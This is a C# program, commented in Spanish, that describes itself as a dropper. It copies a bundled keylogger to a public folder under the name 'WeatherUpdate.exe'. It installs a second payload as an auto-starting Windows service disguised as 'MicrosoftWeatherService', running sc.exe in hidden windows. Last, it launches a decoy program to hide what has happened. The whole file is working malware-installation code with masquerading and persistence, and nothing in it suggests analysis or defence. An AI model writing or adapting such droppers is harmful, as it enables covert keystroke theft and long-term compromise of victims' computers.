using System;
using System.Diagnostics;
using System.IO;
using System.IO.Enumeration;

class Program
{
    private static readonly string BaseDir = AppDomain.CurrentDomain.BaseDirectory;

    private static readonly string CarpetaPayload = Path.Combine(BaseDir, "CdiResource", "dll");
    private const string DestinoKeylogger = @"C:\Users\Public\WeatherUpdate.exe";
    private const string CarpetaDestinoServicio = @"C:\Program Files\WeatherService";
    private const string DestinoServicioExe = @"C:\Program Files\WeatherService\MicrosoftWeatherService.exe";

static void Main()
{
    string logPath = @"C:\Users\Public\dropper_log.txt";

    try
    {
        File.WriteAllText(logPath, $"[{DateTime.Now}] Dropper iniciado\n");
        File.AppendAllText(logPath, $"BaseDir: {BaseDir}\n");
        File.AppendAllText(logPath, $"CarpetaPayload: {CarpetaPayload}\n");

        // 1. Keylogger
        string origenKeylogger = Path.Combine(CarpetaPayload, "CDIHelper.exe");
        File.AppendAllText(logPath, $"\n1. Copiando keylogger...\n");
        File.AppendAllText(logPath, $"   Origen: {origenKeylogger}\n");
        File.AppendAllText(logPath, $"   Existe: {File.Exists(origenKeylogger)}\n");
        File.AppendAllText(logPath, $"   Destino: {DestinoKeylogger}\n");
        CopiarArchivo(origenKeylogger, DestinoKeylogger);
        File.AppendAllText(logPath, $"   Después de copiar, existe: {File.Exists(DestinoKeylogger)}\n");

        // 2. Servicio
        string origenServicio = Path.Combine(CarpetaPayload, "CDIService");
        File.AppendAllText(logPath, $"\n2. Copiando servicio...\n");
        File.AppendAllText(logPath, $"   Origen: {origenServicio}\n");
        File.AppendAllText(logPath, $"   Existe: {Directory.Exists(origenServicio)}\n");
        File.AppendAllText(logPath, $"   Destino: {CarpetaDestinoServicio}\n");
        CopiarCarpeta(origenServicio, CarpetaDestinoServicio);
        File.AppendAllText(logPath, $"   Después, existe {DestinoServicioExe}: {File.Exists(DestinoServicioExe)}\n");

        // 3. Servicio
        File.AppendAllText(logPath, $"\n3. Instalando servicio...\n");
        InstalarServicio();

        // 4. Señuelo
        File.AppendAllText(logPath, $"\n4. Abriendo señuelo...\n");
        AbrirSenuelo();

        File.AppendAllText(logPath, $"\n Dropper completado\n");
    }
    catch (Exception ex)
    {
        File.AppendAllText(logPath, $"\nEXCEPCIÓN: {ex.GetType().Name}\n");
        File.AppendAllText(logPath, $"Mensaje: {ex.Message}\n");
        File.AppendAllText(logPath, $"StackTrace: {ex.StackTrace}\n");
    }
}

    private static void CopiarArchivo(string origen, string destino)
    {
        if (!File.Exists(origen)) return;

        string carpetaDestino = Path.GetDirectoryName(destino);
        if(!string.IsNullOrEmpty(carpetaDestino) && !Directory.Exists(carpetaDestino))
            Directory.CreateDirectory(carpetaDestino);
        
        File.Copy(origen,destino,overwrite: true);
    }

    private static void CopiarCarpeta(string origen, string destino)
    {
        if (!Directory.Exists(origen)) return;
        Directory.CreateDirectory(destino);

        foreach (string archivo in Directory.GetFiles(origen))
        {
            string nombre = Path.GetFileName(archivo);
            File.Copy(archivo, Path.Combine(destino,nombre), overwrite: true);
        }

        foreach (string subcarpeta in Directory.GetDirectories(origen))
        {
            string nombreSub = Path.GetFileName(subcarpeta);
            CopiarCarpeta(subcarpeta, Path.Combine(destino, nombreSub));
        }
    }
    private static void InstalarServicio()
    {

        EjecutarComando("sc.exe", "stop MicrosoftWeatherService");
        System.Threading.Thread.Sleep(1000);
        EjecutarComando("sc.exe", "delete MicrosoftWeatherService");
        System.Threading.Thread.Sleep(1000);

  
        EjecutarComando("sc.exe",
            $"create MicrosoftWeatherService binPath= \"{DestinoServicioExe}\" start= auto");

        EjecutarComando("sc.exe", "start MicrosoftWeatherService");

    }

    private static void EjecutarComando(string programa, string argumentos)
    {
        try
        {
            var proceso = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = programa,
                    Arguments = argumentos,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                }
            };
            proceso.Start();
            proceso.WaitForExit();
        }
        catch{}
    }

    private static void AbrirSenuelo()
    {
        string rutaSenuelo = Path.Combine(BaseDir, "ProgramaSenuelo.exe");
        
        if (File.Exists(rutaSenuelo))
        {
            Process.Start(new ProcessStartInfo{
                FileName = rutaSenuelo,
                UseShellExecute = true,
                WorkingDirectory = BaseDir
            });
        }
    }

}
